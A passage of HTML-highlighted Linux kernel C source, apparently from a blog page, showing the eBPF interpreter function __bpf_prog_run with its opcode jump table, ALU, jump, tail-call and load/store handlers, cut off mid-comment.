class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *    __bpf_prog_run - run eBPF program on a given context</span></span><br><span class="line"><span class="comment"> *    @ctx: is the data we are operating on</span></span><br><span class="line"><span class="comment"> *    @insn: is the array of eBPF instructions</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Decode and execute eBPF instructions.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> __bpf_prog_run(<span class="keyword">void</span> *ctx, <span class="keyword">const</span> struct bpf_insn *insn)</span><br><span class="line">&#123;</span><br><span class="line">    u64 <span class="built_in">stack</span>[MAX_BPF_STACK / <span class="keyword">sizeof</span>(u64)];</span><br><span class="line">    u64 regs[MAX_BPF_REG], tmp;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">void</span> *jumptable[<span class="number">256</span>] = &#123;</span><br><span class="line">        [<span class="number">0</span> ... <span class="number">255</span>] = &amp;&amp;default_label,</span><br><span class="line">        <span class="comment">/* Now overwrite non-defaults ... */</span></span><br><span class="line">        <span class="comment">/* 32 bit ALU operations */</span></span><br><span class="line">        [BPF_ALU | BPF_ADD | BPF_X] = &amp;&amp;ALU_ADD_X,</span><br><span class="line">        [BPF_ALU | BPF_ADD | BPF_K] = &amp;&amp;ALU_ADD_K,</span><br><span class="line">        [BPF_ALU | BPF_SUB | BPF_X] = &amp;&amp;ALU_SUB_X,</span><br><span class="line">        [BPF_ALU | BPF_SUB | BPF_K] = &amp;&amp;ALU_SUB_K,</span><br><span class="line">        [BPF_ALU | BPF_AND | BPF_X] = &amp;&amp;ALU_AND_X,</span><br><span class="line">        [BPF_ALU | BPF_AND | BPF_K] = &amp;&amp;ALU_AND_K,</span><br><span class="line">        [BPF_ALU | BPF_OR | BPF_X]  = &amp;&amp;ALU_OR_X,</span><br><span class="line">        [BPF_ALU | BPF_OR | BPF_K]  = &amp;&amp;ALU_OR_K,</span><br><span class="line">        [BPF_ALU | BPF_LSH | BPF_X] = &amp;&amp;ALU_LSH_X,</span><br><span class="line">        [BPF_ALU | BPF_LSH | BPF_K] = &amp;&amp;ALU_LSH_K,</span><br><span class="line">        [BPF_ALU | BPF_RSH | BPF_X] = &amp;&amp;ALU_RSH_X,</span><br><span class="line">        [BPF_ALU | BPF_RSH | BPF_K] = &amp;&amp;ALU_RSH_K,</span><br><span class="line">        [BPF_ALU | BPF_XOR | BPF_X] = &amp;&amp;ALU_XOR_X,</span><br><span class="line">        [BPF_ALU | BPF_XOR | BPF_K] = &amp;&amp;ALU_XOR_K,</span><br><span class="line">        [BPF_ALU | BPF_MUL | BPF_X] = &amp;&amp;ALU_MUL_X,</span><br><span class="line">        [BPF_ALU | BPF_MUL | BPF_K] = &amp;&amp;ALU_MUL_K,</span><br><span class="line">        [BPF_ALU | BPF_MOV | BPF_X] = &amp;&amp;ALU_MOV_X,</span><br><span class="line">        [BPF_ALU | BPF_MOV | BPF_K] = &amp;&amp;ALU_MOV_K,</span><br><span class="line">        [BPF_ALU | BPF_DIV | BPF_X] = &amp;&amp;ALU_DIV_X,</span><br><span class="line">        [BPF_ALU | BPF_DIV | BPF_K] = &amp;&amp;ALU_DIV_K,</span><br><span class="line">        [BPF_ALU | BPF_MOD | BPF_X] = &amp;&amp;ALU_MOD_X,</span><br><span class="line">        [BPF_ALU | BPF_MOD | BPF_K] = &amp;&amp;ALU_MOD_K,</span><br><span class="line">        [BPF_ALU | BPF_NEG] = &amp;&amp;ALU_NEG,</span><br><span class="line">        [BPF_ALU | BPF_END | BPF_TO_BE] = &amp;&amp;ALU_END_TO_BE,</span><br><span class="line">        [BPF_ALU | BPF_END | BPF_TO_LE] = &amp;&amp;ALU_END_TO_LE,</span><br><span class="line">        <span class="comment">/* 64 bit ALU operations */</span></span><br><span class="line">        [BPF_ALU64 | BPF_ADD | BPF_X] = &amp;&amp;ALU64_ADD_X,</span><br><span class="line">        [BPF_ALU64 | BPF_ADD | BPF_K] = &amp;&amp;ALU64_ADD_K,</span><br><span class="line">        [BPF_ALU64 | BPF_SUB | BPF_X] = &amp;&amp;ALU64_SUB_X,</span><br><span class="line">        [BPF_ALU64 | BPF_SUB | BPF_K] = &amp;&amp;ALU64_SUB_K,</span><br><span class="line">        [BPF_ALU64 | BPF_AND | BPF_X] = &amp;&amp;ALU64_AND_X,</span><br><span class="line">        [BPF_ALU64 | BPF_AND | BPF_K] = &amp;&amp;ALU64_AND_K,</span><br><span class="line">        [BPF_ALU64 | BPF_OR | BPF_X] = &amp;&amp;ALU64_OR_X,</span><br><span class="line">        [BPF_ALU64 | BPF_OR | BPF_K] = &amp;&amp;ALU64_OR_K,</span><br><span class="line">        [BPF_ALU64 | BPF_LSH | BPF_X] = &amp;&amp;ALU64_LSH_X,</span><br><span class="line">        [BPF_ALU64 | BPF_LSH | BPF_K] = &amp;&amp;ALU64_LSH_K,</span><br><span class="line">        [BPF_ALU64 | BPF_RSH | BPF_X] = &amp;&amp;ALU64_RSH_X,</span><br><span class="line">        [BPF_ALU64 | BPF_RSH | BPF_K] = &amp;&amp;ALU64_RSH_K,</span><br><span class="line">        [BPF_ALU64 | BPF_XOR | BPF_X] = &amp;&amp;ALU64_XOR_X,</span><br><span class="line">        [BPF_ALU64 | BPF_XOR | BPF_K] = &amp;&amp;ALU64_XOR_K,</span><br><span class="line">        [BPF_ALU64 | BPF_MUL | BPF_X] = &amp;&amp;ALU64_MUL_X,</span><br><span class="line">        [BPF_ALU64 | BPF_MUL | BPF_K] = &amp;&amp;ALU64_MUL_K,</span><br><span class="line">        [BPF_ALU64 | BPF_MOV | BPF_X] = &amp;&amp;ALU64_MOV_X,</span><br><span class="line">        [BPF_ALU64 | BPF_MOV | BPF_K] = &amp;&amp;ALU64_MOV_K,</span><br><span class="line">        [BPF_ALU64 | BPF_ARSH | BPF_X] = &amp;&amp;ALU64_ARSH_X,</span><br><span class="line">        [BPF_ALU64 | BPF_ARSH | BPF_K] = &amp;&amp;ALU64_ARSH_K,</span><br><span class="line">        [BPF_ALU64 | BPF_DIV | BPF_X] = &amp;&amp;ALU64_DIV_X,</span><br><span class="line">        [BPF_ALU64 | BPF_DIV | BPF_K] = &amp;&amp;ALU64_DIV_K,</span><br><span class="line">        [BPF_ALU64 | BPF_MOD | BPF_X] = &amp;&amp;ALU64_MOD_X,</span><br><span class="line">        [BPF_ALU64 | BPF_MOD | BPF_K] = &amp;&amp;ALU64_MOD_K,</span><br><span class="line">        [BPF_ALU64 | BPF_NEG] = &amp;&amp;ALU64_NEG,</span><br><span class="line">        <span class="comment">/* Call instruction */</span></span><br><span class="line">        [BPF_JMP | BPF_CALL] = &amp;&amp;JMP_CALL,</span><br><span class="line">        [BPF_JMP | BPF_CALL | BPF_X] = &amp;&amp;JMP_TAIL_CALL,</span><br><span class="line">        <span class="comment">/* Jumps */</span></span><br><span class="line">        [BPF_JMP | BPF_JA] = &amp;&amp;JMP_JA,</span><br><span class="line">        [BPF_JMP | BPF_JEQ | BPF_X] = &amp;&amp;JMP_JEQ_X,</span><br><span class="line">        [BPF_JMP | BPF_JEQ | BPF_K] = &amp;&amp;JMP_JEQ_K,</span><br><span class="line">        [BPF_JMP | BPF_JNE | BPF_X] = &amp;&amp;JMP_JNE_X,</span><br><span class="line">        [BPF_JMP | BPF_JNE | BPF_K] = &amp;&amp;JMP_JNE_K,</span><br><span class="line">        [BPF_JMP | BPF_JGT | BPF_X] = &amp;&amp;JMP_JGT_X,</span><br><span class="line">        [BPF_JMP | BPF_JGT | BPF_K] = &amp;&amp;JMP_JGT_K,</span><br><span class="line">        [BPF_JMP | BPF_JGE | BPF_X] = &amp;&amp;JMP_JGE_X,</span><br><span class="line">        [BPF_JMP | BPF_JGE | BPF_K] = &amp;&amp;JMP_JGE_K,</span><br><span class="line">        [BPF_JMP | BPF_JSGT | BPF_X] = &amp;&amp;JMP_JSGT_X,</span><br><span class="line">        [BPF_JMP | BPF_JSGT | BPF_K] = &amp;&amp;JMP_JSGT_K,</span><br><span class="line">        [BPF_JMP | BPF_JSGE | BPF_X] = &amp;&amp;JMP_JSGE_X,</span><br><span class="line">        [BPF_JMP | BPF_JSGE | BPF_K] = &amp;&amp;JMP_JSGE_K,</span><br><span class="line">        [BPF_JMP | BPF_JSET | BPF_X] = &amp;&amp;JMP_JSET_X,</span><br><span class="line">        [BPF_JMP | BPF_JSET | BPF_K] = &amp;&amp;JMP_JSET_K,</span><br><span class="line">        <span class="comment">/* Program return */</span></span><br><span class="line">        [BPF_JMP | BPF_EXIT] = &amp;&amp;JMP_EXIT,</span><br><span class="line">        <span class="comment">/* Store instructions */</span></span><br><span class="line">        [BPF_STX | BPF_MEM | BPF_B] = &amp;&amp;STX_MEM_B,</span><br><span class="line">        [BPF_STX | BPF_MEM | BPF_H] = &amp;&amp;STX_MEM_H,</span><br><span class="line">        [BPF_STX | BPF_MEM | BPF_W] = &amp;&amp;STX_MEM_W,</span><br><span class="line">        [BPF_STX | BPF_MEM | BPF_DW] = &amp;&amp;STX_MEM_DW,</span><br><span class="line">        [BPF_STX | BPF_XADD | BPF_W] = &amp;&amp;STX_XADD_W,</span><br><span class="line">        [BPF_STX | BPF_XADD | BPF_DW] = &amp;&amp;STX_XADD_DW,</span><br><span class="line">        [BPF_ST | BPF_MEM | BPF_B] = &amp;&amp;ST_MEM_B,</span><br><span class="line">        [BPF_ST | BPF_MEM | BPF_H] = &amp;&amp;ST_MEM_H,</span><br><span class="line">        [BPF_ST | BPF_MEM | BPF_W] = &amp;&amp;ST_MEM_W,</span><br><span class="line">        [BPF_ST | BPF_MEM | BPF_DW] = &amp;&amp;ST_MEM_DW,</span><br><span class="line">        <span class="comment">/* Load instructions */</span></span><br><span class="line">        [BPF_LDX | BPF_MEM | BPF_B] = &amp;&amp;LDX_MEM_B,</span><br><span class="line">        [BPF_LDX | BPF_MEM | BPF_H] = &amp;&amp;LDX_MEM_H,</span><br><span class="line">        [BPF_LDX | BPF_MEM | BPF_W] = &amp;&amp;LDX_MEM_W,</span><br><span class="line">        [BPF_LDX | BPF_MEM | BPF_DW] = &amp;&amp;LDX_MEM_DW,</span><br><span class="line">        [BPF_LD | BPF_ABS | BPF_W] = &amp;&amp;LD_ABS_W,</span><br><span class="line">        [BPF_LD | BPF_ABS | BPF_H] = &amp;&amp;LD_ABS_H,</span><br><span class="line">        [BPF_LD | BPF_ABS | BPF_B] = &amp;&amp;LD_ABS_B,</span><br><span class="line">        [BPF_LD | BPF_IND | BPF_W] = &amp;&amp;LD_IND_W,</span><br><span class="line">        [BPF_LD | BPF_IND | BPF_H] = &amp;&amp;LD_IND_H,</span><br><span class="line">        [BPF_LD | BPF_IND | BPF_B] = &amp;&amp;LD_IND_B,</span><br><span class="line">        [BPF_LD | BPF_IMM | BPF_DW] = &amp;&amp;LD_IMM_DW,</span><br><span class="line">    &#125;;</span><br><span class="line">    u32 tail_call_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">void</span> *ptr;</span><br><span class="line">    <span class="keyword">int</span> off;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONT     (&#123; insn++; goto select_insn; &#125;)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONT_JMP (&#123; insn++; goto select_insn; &#125;)</span></span><br><span class="line"></span><br><span class="line">    FP = (u64) (<span class="keyword">unsigned</span> <span class="keyword">long</span>) &amp;<span class="built_in">stack</span>[ARRAY_SIZE(<span class="built_in">stack</span>)];</span><br><span class="line">    ARG1 = (u64) (<span class="keyword">unsigned</span> <span class="keyword">long</span>) ctx;</span><br><span class="line"></span><br><span class="line">select_insn:</span><br><span class="line">    <span class="keyword">goto</span> *jumptable[insn-&gt;code];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ALU */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALU(OPCODE, OP)            \</span></span><br><span class="line">    ALU64_##OPCODE##_X:        \</span><br><span class="line">        DST = DST OP SRC;    \</span><br><span class="line">        CONT;            \</span><br><span class="line">    ALU_##OPCODE##_X:        \</span><br><span class="line">        DST = (u32) DST OP (u32) SRC;    \</span><br><span class="line">        CONT;            \</span><br><span class="line">    ALU64_##OPCODE##_K:        \</span><br><span class="line">        DST = DST OP IMM;        \</span><br><span class="line">        CONT;            \</span><br><span class="line">    ALU_##OPCODE##_K:        \</span><br><span class="line">        DST = (u32) DST OP (u32) IMM;    \</span><br><span class="line">        CONT;</span><br><span class="line"></span><br><span class="line">    ALU(ADD,  +)</span><br><span class="line">    ALU(SUB,  -)</span><br><span class="line">    ALU(AND,  &amp;)</span><br><span class="line">    ALU(OR,   |)</span><br><span class="line">    ALU(LSH, &lt;&lt;)</span><br><span class="line">    ALU(RSH, &gt;&gt;)</span><br><span class="line">    ALU(XOR,  ^)</span><br><span class="line">    ALU(MUL,  *)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> ALU</span></span><br><span class="line">    ALU_NEG:</span><br><span class="line">        DST = (u32) -DST;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU64_NEG:</span><br><span class="line">        DST = -DST;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU_MOV_X:</span><br><span class="line">        DST = (u32) SRC;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU_MOV_K:</span><br><span class="line">        DST = (u32) IMM;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU64_MOV_X:</span><br><span class="line">        DST = SRC;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU64_MOV_K:</span><br><span class="line">        DST = IMM;</span><br><span class="line">        CONT;</span><br><span class="line">    LD_IMM_DW:</span><br><span class="line">        DST = (u64) (u32) insn[<span class="number">0</span>].imm | ((u64) (u32) insn[<span class="number">1</span>].imm) &lt;&lt; <span class="number">32</span>;</span><br><span class="line">        insn++;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU64_ARSH_X:</span><br><span class="line">        (*(s64 *) &amp;DST) &gt;&gt;= SRC;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU64_ARSH_K:</span><br><span class="line">        (*(s64 *) &amp;DST) &gt;&gt;= IMM;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU64_MOD_X:</span><br><span class="line">        <span class="keyword">if</span> (unlikely(SRC == <span class="number">0</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        div64_u64_rem(DST, SRC, &amp;tmp);</span><br><span class="line">        DST = tmp;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU_MOD_X:</span><br><span class="line">        <span class="keyword">if</span> (unlikely(SRC == <span class="number">0</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        tmp = (u32) DST;</span><br><span class="line">        DST = do_div(tmp, (u32) SRC);</span><br><span class="line">        CONT;</span><br><span class="line">    ALU64_MOD_K:</span><br><span class="line">        div64_u64_rem(DST, IMM, &amp;tmp);</span><br><span class="line">        DST = tmp;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU_MOD_K:</span><br><span class="line">        tmp = (u32) DST;</span><br><span class="line">        DST = do_div(tmp, (u32) IMM);</span><br><span class="line">        CONT;</span><br><span class="line">    ALU64_DIV_X:</span><br><span class="line">        <span class="keyword">if</span> (unlikely(SRC == <span class="number">0</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        DST = div64_u64(DST, SRC);</span><br><span class="line">        CONT;</span><br><span class="line">    ALU_DIV_X:</span><br><span class="line">        <span class="keyword">if</span> (unlikely(SRC == <span class="number">0</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        tmp = (u32) DST;</span><br><span class="line">        do_div(tmp, (u32) SRC);</span><br><span class="line">        DST = (u32) tmp;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU64_DIV_K:</span><br><span class="line">        DST = div64_u64(DST, IMM);</span><br><span class="line">        CONT;</span><br><span class="line">    ALU_DIV_K:</span><br><span class="line">        tmp = (u32) DST;</span><br><span class="line">        do_div(tmp, (u32) IMM);</span><br><span class="line">        DST = (u32) tmp;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU_END_TO_BE:</span><br><span class="line">        <span class="keyword">switch</span> (IMM) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">            DST = (__force u16) cpu_to_be16(DST);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">32</span>:</span><br><span class="line">            DST = (__force u32) cpu_to_be32(DST);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">64</span>:</span><br><span class="line">            DST = (__force u64) cpu_to_be64(DST);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU_END_TO_LE:</span><br><span class="line">        <span class="keyword">switch</span> (IMM) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">            DST = (__force u16) cpu_to_le16(DST);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">32</span>:</span><br><span class="line">            DST = (__force u32) cpu_to_le32(DST);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">64</span>:</span><br><span class="line">            DST = (__force u64) cpu_to_le64(DST);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* CALL */</span></span><br><span class="line">    JMP_CALL:</span><br><span class="line">        <span class="comment">/* Function call scratches BPF_R1-BPF_R5 registers,</span></span><br><span class="line"><span class="comment">         * preserves BPF_R6-BPF_R9, and stores return value</span></span><br><span class="line"><span class="comment">         * into BPF_R0.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        BPF_R0 = (__bpf_call_base + insn-&gt;imm)(BPF_R1, BPF_R2, BPF_R3,</span><br><span class="line">                               BPF_R4, BPF_R5);</span><br><span class="line">        CONT;</span><br><span class="line"></span><br><span class="line">    JMP_TAIL_CALL: &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span> =</span> (struct bpf_map *) (<span class="keyword">unsigned</span> <span class="keyword">long</span>) BPF_R2;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_array</span> *<span class="title">array</span> =</span> container_of(<span class="built_in">map</span>, struct bpf_array, <span class="built_in">map</span>);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_prog</span> *<span class="title">prog</span>;</span></span><br><span class="line">        u64 index = BPF_R3;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (unlikely(index &gt;= <span class="built_in">array</span>-&gt;<span class="built_in">map</span>.max_entries))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (unlikely(tail_call_cnt &gt; MAX_TAIL_CALL_CNT))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        tail_call_cnt++;</span><br><span class="line"></span><br><span class="line">        prog = READ_ONCE(<span class="built_in">array</span>-&gt;ptrs[index]);</span><br><span class="line">        <span class="keyword">if</span> (unlikely(!prog))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* ARG1 at this point is guaranteed to point to CTX from</span></span><br><span class="line"><span class="comment">         * the verifier side due to the fact that the tail call is</span></span><br><span class="line"><span class="comment">         * handeled like a helper, that is, bpf_tail_call_proto,</span></span><br><span class="line"><span class="comment">         * where arg1_type is ARG_PTR_TO_CTX.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        insn = prog-&gt;insnsi;</span><br><span class="line">        <span class="keyword">goto</span> select_insn;</span><br><span class="line">out:</span><br><span class="line">        CONT;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* JMP */</span></span><br><span class="line">    JMP_JA:</span><br><span class="line">        insn += insn-&gt;off;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JEQ_X:</span><br><span class="line">        <span class="keyword">if</span> (DST == SRC) &#123;</span><br><span class="line">            insn += insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JEQ_K:</span><br><span class="line">        <span class="keyword">if</span> (DST == IMM) &#123;</span><br><span class="line">            insn += insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JNE_X:</span><br><span class="line">        <span class="keyword">if</span> (DST != SRC) &#123;</span><br><span class="line">            insn += insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JNE_K:</span><br><span class="line">        <span class="keyword">if</span> (DST != IMM) &#123;</span><br><span class="line">            insn += insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JGT_X:</span><br><span class="line">        <span class="keyword">if</span> (DST &gt; SRC) &#123;</span><br><span class="line">            insn += insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JGT_K:</span><br><span class="line">        <span class="keyword">if</span> (DST &gt; IMM) &#123;</span><br><span class="line">            insn += insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JGE_X:</span><br><span class="line">        <span class="keyword">if</span> (DST &gt;= SRC) &#123;</span><br><span class="line">            insn += insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JGE_K:</span><br><span class="line">        <span class="keyword">if</span> (DST &gt;= IMM) &#123;</span><br><span class="line">            insn += insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JSGT_X:</span><br><span class="line">        <span class="keyword">if</span> (((s64) DST) &gt; ((s64) SRC)) &#123;</span><br><span class="line">            insn += insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JSGT_K:</span><br><span class="line">        <span class="keyword">if</span> (((s64) DST) &gt; ((s64) IMM)) &#123;</span><br><span class="line">            insn += insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JSGE_X:</span><br><span class="line">        <span class="keyword">if</span> (((s64) DST) &gt;= ((s64) SRC)) &#123;</span><br><span class="line">            insn += insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JSGE_K:</span><br><span class="line">        <span class="keyword">if</span> (((s64) DST) &gt;= ((s64) IMM)) &#123;</span><br><span class="line">            insn += insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JSET_X:</span><br><span class="line">        <span class="keyword">if</span> (DST &amp; SRC) &#123;</span><br><span class="line">            insn += insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JSET_K:</span><br><span class="line">        <span class="keyword">if</span> (DST &amp; IMM) &#123;</span><br><span class="line">            insn += insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_EXIT:</span><br><span class="line">        <span class="keyword">return</span> BPF_R0;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* STX and ST and LDX*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LDST(SIZEOP, SIZE)                        \</span></span><br><span class="line">    STX_MEM_##SIZEOP:                        \</span><br><span class="line">        *(SIZE *)(<span class="keyword">unsigned</span> <span class="keyword">long</span>) (DST + insn-&gt;off) = SRC;    \</span><br><span class="line">        CONT;                            \</span><br><span class="line">    ST_MEM_##SIZEOP:                        \</span><br><span class="line">        *(SIZE *)(<span class="keyword">unsigned</span> <span class="keyword">long</span>) (DST + insn-&gt;off) = IMM;    \</span><br><span class="line">        CONT;                            \</span><br><span class="line">    LDX_MEM_##SIZEOP:                        \</span><br><span class="line">        DST = *(SIZE *)(<span class="keyword">unsigned</span> <span class="keyword">long</span>) (SRC + insn-&gt;off);    \</span><br><span class="line">        CONT;</span><br><span class="line"></span><br><span class="line">    LDST(B,   u8)</span><br><span class="line">    LDST(H,  u16)</span><br><span class="line">    LDST(W,  u32)</span><br><span class="line">    LDST(DW, u64)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> LDST</span></span><br><span class="line">    STX_XADD_W: <span class="comment">/* lock xadd *(u32 *)(dst_reg + off16) += src_reg */</span></span><br><span class="line">        atomic_add((u32) SRC, (<span class="keyword">atomic_t</span> *)(<span class="keyword">unsigned</span> <span class="keyword">long</span>)</span><br><span class="line">               (DST + insn-&gt;off));</span><br><span class="line">        CONT;</span><br><span class="line">    STX_XADD_DW: <span class="comment">/* lock xadd *(u64 *)(dst_reg + off16) += src_reg */</span></span><br><span class="line">        atomic64_add((u64) SRC, (<span class="keyword">atomic64_t</span> *)(<span class="keyword">unsigned</span> <span class="keyword">long</span>)</span><br><span class="line">                 (DST + insn-&gt;off));</span><br><span class="line">        CONT;</span><br><span class="line">    LD_ABS_W: <span class="comment">/* BPF_R0 = ntohl(*(u32 *) (skb-&gt;data + imm32)) */</span></span><br><span class="line">        off = IMM;</span><br><span class="line">load_word:</span><br><span class="line">        <span class="comment">/* BPF_LD + BPD_ABS and BPF_LD + BPF_IND insns are</span></span><br><span class="line"><span class="comment">         * only appearing in the programs where ctx ==</span></span><br><span class="line"><span class="comment">         * skb. All programs keep &#x27;ctx&#x27; in regs[BPF_REG_CTX]</span></span><br><span class="line"><span class="comment">         * == BPF_R6, bpf_convert_filter() saves it in BPF_R6,</span></span><br><span class="line"><span class="comment">         * internal BPF verifier will check that BPF_R6 ==</span></span><br><span class="line"><span class="comment">         * ctx.</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * BPF_ABS and BPF_IND are wrappers of function calls,</span></span><br><span class="line"><span class="comment">         * so they scratch BPF_R1-BPF_R5 registers, preserve</span></span><br><span class="line"><span class="comment">         * BPF_R6-BPF_R9, and store return value into BPF_R0.</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * Implicit input:</span></span><br><span class="line"><span class="comment">         *   ctx == skb == BPF_R6 == CTX</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * Explicit input:</span></span><br><span class="line"><span class="comment">         *   SRC == any 